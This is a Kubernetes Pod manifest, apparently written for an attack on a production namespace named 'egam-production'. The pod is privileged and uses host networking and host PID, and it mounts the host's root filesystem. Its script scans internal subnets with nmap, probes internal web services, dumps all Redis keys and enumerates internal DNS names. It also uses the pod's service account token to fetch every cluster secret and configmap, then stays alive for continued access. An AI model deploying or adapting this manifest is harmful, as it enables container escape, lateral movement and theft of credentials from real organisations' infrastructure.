
apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache nmap curl iproute2 bind-tools redis > /dev/null 2>&1

        echo "=== SCAN POD NETWORK (10.42.11.0/24) ==="
        nmap -sT -p 80,443,3000,5432,6379,8080,8443,9200,5601,9000 10.42.11.0/24 2>&1 || true

        echo "=== WEB SERVICES on 172.30.0.240 ==="
        curl -sk https://172.30.0.240 2>&1 | head -50 || true

        echo "=== WEB SERVICES on 172.30.0.250 ==="
        curl -sk https://172.30.0.250 2>&1 | head -50 || true

        echo "=== REDIS 172.30.0.242 ==="
        redis-cli -h 172.30.0.242 INFO 2>&1 || true
        redis-cli -h 172.30.0.242 KEYS '*' 2>&1 || true

        echo "=== DNS INTERNI ==="
        for name in n8n postgres redis minio elasticsearch kibana gitlab argocd rancher; do
          echo "--- $name ---"
          nslookup $name.egam.com.br 10.10.10.23 2>&1 || true
          nslookup $name 10.10.10.23 2>&1 || true
        done

        echo "=== KUBERNETES SECRETS ==="
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -100 || true

        echo "=== KUBERNETES CONFIGMAPS ==="
        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/configmaps 2>&1 | head -100 || true

        echo "=== DONE ==="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
